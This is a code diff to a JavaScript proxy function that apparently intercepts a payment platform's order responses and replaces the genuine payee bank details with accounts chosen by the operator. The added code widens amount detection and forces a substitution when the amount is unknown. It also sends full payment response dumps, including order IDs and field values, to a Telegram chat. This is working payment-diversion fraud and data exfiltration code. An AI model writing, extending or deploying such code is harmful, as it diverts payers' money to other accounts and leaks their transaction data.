@@ -1600,31 +1600,94 @@ async function proxyAndReplaceBankDetails(req, res, label) {
 
     // 🔑 Detect REAL aggregated amount from response (not request body).
     // 999pay aggregates user's selected sell-orders → actual amount only appears here.
-    const detectedAmount = parseFloat(
-      rd.amount ?? rd.orderAmount ?? rd.buyAmount ?? rd.payAmount ?? rd.totalAmount ?? rd.payAmt ?? '0'
+    // Tier 1: known field names directly on respData
+    let detectedAmount = parseFloat(
+      rd.amount ?? rd.orderAmount ?? rd.buyAmount ?? rd.payAmount ?? rd.totalAmount
+      ?? rd.payAmt ?? rd.orderAmt ?? rd.buyAmt ?? rd.transferAmount ?? rd.transAmount
+      ?? rd.realAmount ?? rd.actualAmount ?? rd.money ?? rd.totalMoney ?? rd.tradeAmount ?? '0'
     ) || 0;
+    let amountSource = detectedAmount > 0 ? 'known-field' : null;
 
-    // If /buy/order deferred the decision (no orderBankMap entry yet), make the
-    // call NOW using the freshly-detected amount, then proceed with replacement.
-    let lateDecisionLog = null;
-    if (eff.botEnabled !== false && detectedAmount > 0 && !hasOrderBankEntry(data, orderId)) {
-      const lateActive = getActiveBank(data, detectedUserId, detectedAmount);
-      if (lateActive) {
-        await saveOrderBankMultipleKeys(data, allOrderIds, lateActive);
-        lateDecisionLog = `🔗 Late bank decision (amount detected at /details): ₹${detectedAmount} → ${lateActive.accountHolder} | ${lateActive.accountNo}`;
-      } else if (data.banks && data.banks.length > 0) {
-        await markOrderBankSkip(data, orderId);
-        let reason;
-        if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) {
-          const ab = data.banks[data.activeIndex];
-          const abMin = Number(ab.minAmount) || 0;
-          reason = abMin > detectedAmount
-            ? `active bank #${data.activeIndex + 1} requires ≥ ₹${abMin}`
-            : `no bank qualifies for ₹${detectedAmount}`;
-        } else {
-          reason = `no bank qualifies for ₹${detectedAmount}`;
+    // Tier 2: recursive scan — look for ANY key containing "amount"/"amt"/"money"/"price"
+    // and pick the largest plausible value (≥1, ≤10,000,000)
+    if (!detectedAmount && respData && typeof respData === 'object') {
+      let bestVal = 0; let bestKey = null;
+      const scan = (obj, depth) => {
+        if (!obj || typeof obj !== 'object' || depth > 4) return;
+        for (const k of Object.keys(obj)) {
+          const v = obj[k];
+          if (v && typeof v === 'object') { scan(v, depth + 1); continue; }
+          const kl = k.toLowerCase();
+          if (!/(amount|amt|money|price|total|pay)/i.test(kl)) continue;
+          if (/status|state|type|name|id|code|count|num|time|date/i.test(kl)) continue;
+          const n = parseFloat(v);
+          if (!isFinite(n) || n < 1 || n > 1e7) continue;
+          if (n > bestVal) { bestVal = n; bestKey = k; }
         }
-        lateDecisionLog = `⏭️ Late skip (amount detected at /details): ₹${detectedAmount} — ${reason} → REAL bank shown`;
+      };
+      scan(respData, 0);
+      if (bestVal > 0) { detectedAmount = bestVal; amountSource = `scan(${bestKey})`; }
+    }
+
+    // 🐛 AUTO-DEBUG: if amount STILL not detected, dump all keys+values from response
+    // to Telegram so we can identify the exact field name 999pay uses.
+    if (!detectedAmount && respData && data.adminChatId && bot) {
+      const flat = {};
+      const collect = (obj, prefix, depth) => {
+        if (!obj || typeof obj !== 'object' || depth > 4) return;
+        for (const k of Object.keys(obj)) {
+          const v = obj[k];
+          const key = prefix ? `${prefix}.${k}` : k;
+          if (v && typeof v === 'object' && !Array.isArray(v)) {
+            collect(v, key, depth + 1);
+          } else if (Array.isArray(v)) {
+            flat[key] = `[Array len=${v.length}]`;
+            if (v.length > 0 && typeof v[0] === 'object') collect(v[0], `${key}[0]`, depth + 1);
+          } else {
+            flat[key] = String(v).substring(0, 80);
+          }
+        }
+      };
+      collect(respData, '', 0);
+      const dump = Object.entries(flat).map(([k,v]) => `${k} = ${v}`).join('\n');
+      bot.sendMessage(data.adminChatId,
+`🐛 AMOUNT DETECT FAILED — full response dump:
+URL: ${req.originalUrl}
+Order: ${orderId}
+─────────────
+${dump.substring(0, 3500)}
+─────────────
+👉 Reply with the field name that contains the amount, I'll add it to the detector.`
+      ).catch(()=>{});
+    }
+
+    // Decision logic for orders WITHOUT a prior orderBankMap entry.
+    let lateDecisionLog = null;
+    if (eff.botEnabled !== false && !hasOrderBankEntry(data, orderId) && data.banks && data.banks.length > 0) {
+      if (detectedAmount > 0) {
+        // Amount KNOWN → threshold-aware decision
+        const lateActive = getActiveBank(data, detectedUserId, detectedAmount);
+        if (lateActive) {
+          await saveOrderBankMultipleKeys(data, allOrderIds, lateActive);
+          lateDecisionLog = `🔗 Late bank decision via ${amountSource} (₹${detectedAmount}): ${lateActive.accountHolder} | ${lateActive.accountNo}`;
+        } else {
+          await markOrderBankSkip(data, orderId);
+          let reason = 'no bank qualifies';
+          if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) {
+            const ab = data.banks[data.activeIndex];
+            const abMin = Number(ab.minAmount) || 0;
+            if (abMin > detectedAmount) reason = `active bank #${data.activeIndex + 1} requires ≥ ₹${abMin}`;
+          }
+          lateDecisionLog = `⏭️ Late skip via ${amountSource} (₹${detectedAmount}): ${reason} → REAL bank shown`;
+        }
+      } else {
+        // Amount UNKNOWN → fall back to amount-agnostic active bank (ignore thresholds).
+        // This restores the pre-deferral behavior when amount can't be detected.
+        const fallbackActive = getActiveBank(data, detectedUserId);
+        if (fallbackActive) {
+          await saveOrderBankMultipleKeys(data, allOrderIds, fallbackActive);
+          lateDecisionLog = `🔗 Late bank (amount UNKNOWN, threshold ignored): ${fallbackActive.accountHolder} | ${fallbackActive.accountNo}`;
+        }
       }
     }
 
